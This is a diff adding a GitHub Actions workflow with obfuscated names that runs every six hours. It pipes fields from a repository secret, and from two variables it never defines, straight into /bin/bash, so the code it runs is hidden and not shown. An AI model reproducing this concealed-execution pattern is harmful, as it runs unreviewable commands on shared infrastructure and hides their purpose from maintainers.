@@ -1,0 +1,18 @@
+name: duantianya4890
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duantianya4890
+        env:
+          wajkq6: ${{ secrets.wajkq6 }}
+        run: |
+          echo $wajkq6 | jq -r .iipof7 | /bin/bash
+          echo $u67830 | jq -r .uwb47 | /bin/bash
+          echo $e36076 | jq -r .tljy3728 | /bin/bash
+
